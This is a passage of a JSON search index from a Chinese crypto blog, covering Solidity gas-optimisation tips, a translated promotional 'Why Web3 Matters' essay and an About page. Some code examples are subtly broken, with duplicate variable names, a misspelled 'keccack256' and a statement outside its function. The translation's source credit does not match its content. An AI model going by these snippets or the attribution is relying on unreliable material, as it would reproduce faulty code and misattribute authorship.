solidity: { version: \"0.8.1\", settings: { optimizer: { enabled: true, runs: 200, }, }, }, }; ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:2","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"优化变量声明顺序 solidity数据存储在32字节的slots中，采用紧密打包的模式存放数据。因此我们可以通过内存对齐的方式，来减少变量占用的插槽数。如下面的例子。 //占用16+16+32，总共2个slots uint128 a; uint128 b; uint256 b; // 占用32+32+16，总共3个slots uint128 a; uint256 b; uint128 b; ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:3","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"使用字面量代替重复计算的值 在合约中的一些操作，如预先计算合约地址，计算keccack256哈希值，获取创建字节码等，我们可以在编译测试合约的时候获取到字面值，在代码中直接写入它们的字面量，这样就不需要每次调用函数来获取值。 //字面量 bytes32 constant hash = '68b3465833'; //计算 bytes32 constant hash = keccack256(abi.encodePacked('xxxx')); ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:4","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"使用代理合约克隆合约 如果需要克隆多个相同的智能合约，我们需要使用ERC1167标准定义的最小代理合约来将代码执行操作转发到引用的合约上，并在自己的上下文使用它。这样我们就不要每次部署同样的合约代码。这能大大地减少我们的部署成本。 ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:5","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"内联汇编 当你编译一个智能合约的时候，它会被转换为EVM操作码。我们称之为字节码。我们不用直接编写EVM字节码，我们可以使用solidity内联汇编的方式来优化一些操作。如使用creat2预先计算合约地址。虽然内联汇编的方式会带来更多的复杂和不确定性，但也能提供更细粒度的代码控制和执行成本。如下代码所示，使用内联汇编的方式我们可以控制布尔值的赋值成本。 contract GasOptimize{ function isTrue()public pure{ bool a; assembly{ a:=true//21198 a:=not(0)//21190 a:=0x1//21187 } } } ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:6","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"短路规则 以f(x)||g(x)为例，如果f(x)为true，那么就不会执行g(x)函数。因此，在涉及这类操作时，我们可以把成本更高的操作码放在后面。当f(x)成本大于g(x)，我们可以按以下规则编码。 以f(x)||g(x)为例，如果f(x)为true，那么就不会执行g(x)函数。因此，在涉及这类操作时，我们可以把成本更高的操作码放在后面。当f(x)成本大于g(x)，我们可以按以下规则编码。 OR：f(x) || g(x) AND：f(x) \u0026\u0026 g(x) 在成本接近的时候，我们还可以根据返回值的几率来设置短路规则。如果g(x)返回true的概率大于f(x)，OR操作需要把g(x)放在前面，如果g(x)返回false 的概率大于f(x)，AND操作需要把g(x)放在前面。 ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:7","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"循环中使用局部变量 uint a = 0; function test ( uint x ){ for ( uint i = 0 ; i \u003c x ; i++) sum += i; } uint sum = 0; function p3 ( uint x ){ uint temp = 0; for ( uint i = 0 ; i \u003c x ; i++) temp += i; } sum += temp; ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:8","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["Web3"],"content":" 原文链接：https://jeiwan.net/posts/flashloan-scam/ 作者：Ivan Kuznetsov 翻译：https://github.com/7Levy Web1（约为1990-2005）是一种关于非中心化和社区治理的开放协议。其绝大部分价值都集中在边缘网络—用户及构建者。 Web2（约为2005-2000）是由企业运营的孤立、去中心的服务。绝大部分的价值由谷歌、苹果、亚马逊、脸书等屈指可数的公司拥有。 我们现在正处于Web3的萌芽时期，它将web1中去中心化、社区治理的理念和web2中先进且现代的功能相结合。 Web3是由构建者与用户共同拥有的互联网，由令牌编织而成。(译注：一句话概括就是价值互联网) 那么为什么Web3如此重要呢？ 首先，让我们来看看中心化平台的问题所在Why decentralization matters。 中心化平台遵循可预测的生命周期规律。最初，他们竭尽所能去招募用户和第三方，例如创建者、开发者和企业。 他们这么做是为了强化他们的网络效应。随着平台沿着S曲线上升，它们对用户及第三方的影响力稳步增长。 当平台到达顶峰后，他们与网络参与人群的关系，从正和走向零和。为了平台继续增长，需要去从用户中提取数据并与前合作者进行竞争。 关于这方面著名的例子有微软vs网景，谷歌vsYelp，脸书vsZynga，Twitter vs 第三方客户端，以及Epic vs 苹果。 对于第三方来说，从合作到竞争的过渡就像是一个引诱圈套。随着时间的推移，最优秀的一批企业级、研发者和投资者开始不在中心平台进行构建。这种现象抑制了创新。 回归正题，来谈谈web3。在web3中，所有权和控制权是去中心化的。用户和构建者可以通过代币（同质化和非同质化）来拥有部分互联网服务。 代币赋予用户财产权：拥有部分互联网的能力。 NFT让用户拥有自己的所有物，如艺术、照片、代码、音乐、文本、游戏、凭证、治理权、通行证等等人们梦寐以求的东西。 区块链作为一种特殊的计算机，任何人都可以访问，但没有人完全有用它。 以太坊以同质化代币作为动力，ETH，用于激励系统底层的物理机。ETH同事也是系统原生代币，用于交易，如购买NFT。 用户有很多途径可以购买同质化和非同质化代币。你可以购买，但也可以去赚取。 Uniswap协议因向早期用户空投15%治理代币而闻名。像这样的社区馈赠在web3中很普遍，作为一种建立信誉和激励采用的方式。 你可以通过创造和商业行为为获取代币。例如，人们每天售卖NFT赚取大约1亿美金。 代币使网络的参与者们共同努力朝同一个目标前进—网络的发展和代币的升值。 这种现象解决了中心化网络的核心问题，一家公司积累网络的价值，最终与它的用户和合作伙伴竞争。 在web3,之前，用户和构建者必须在web1有限的功能或者是web2团体和中心化的模式中选择。 Web3提供了一种新的方式，结合前时期最好的方面。现在是早期阶段，也是我们参与进入的最好时间。 ","date":"2021-11-27","objectID":"/posts/why-web3-matters/:0:0","tags":["translate","Web3","a16z"],"title":"Why Web3 Matters-为什么Web3如此重要？","uri":"/posts/why-web3-matters/"},{"categories":null,"content":" 专注、开放、包容、自由 币圈老韭菜一枚 区块链从业者 这里是我的博客-记录分享技术研究、市场研究、投资经验…. ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"关于我","uri":"/about/"}]